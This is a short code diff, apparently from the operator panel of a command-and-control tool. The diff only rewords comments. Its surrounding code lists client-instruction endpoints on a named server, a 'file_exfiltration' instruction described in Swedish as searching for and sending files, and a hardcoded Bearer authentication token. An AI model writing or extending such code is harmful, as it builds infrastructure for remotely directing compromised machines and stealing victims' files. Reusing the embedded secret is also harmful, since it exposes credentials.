@@ -30,15 +30,15 @@ const INSTRUCTION_DESCRIPTIONS: Record<string, string> = {
   "file_exfiltration": "Söker och skickar specifika filer"
 };
 
-// Server configuration - Configured to match the WSGI/Apache setup
+// Server configuration - Updated to match the Apache WSGI configuration
 const SERVER_BASE_URL = 'https://neea.fun';
-// API Endpoints based on the WSGI server structure in Apache config
+// API Endpoints aligned with the WSGI configuration in the Apache site config
 const API_CLIENTS_ENDPOINT = '/api/clients';
 const API_CLIENT_INSTRUCTION_ENDPOINT = '/api/clients/{clientId}/instruction';
 const API_CONFIG_ENDPOINT = '/api/get_config';
 const API_INSTRUCTIONS_ENDPOINT = '/api/instructions';
 
-// Authentication token - This should match what is expected by your server
+// Authentication token - Must match what the server expects
 const AUTH_TOKEN = 'SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==';
 
 // Extract scripts from instructions.py
@@ -67,7 +67,7 @@ export async function getScripts(): Promise<ScriptsData> {
   try {
     console.log("Fetching instructions from API:", `${SERVER_BASE_URL}${API_INSTRUCTIONS_ENDPOINT}`);
     
-    // Use the correct API endpoint with proper authorization
+    // Use the API endpoint that's handled by the WSGI application
     const response = await fetch(`${SERVER_BASE_URL}${API_INSTRUCTIONS_ENDPOINT}`, {
       headers: {
         'Authorization': `Bearer ${AUTH_TOKEN}`,
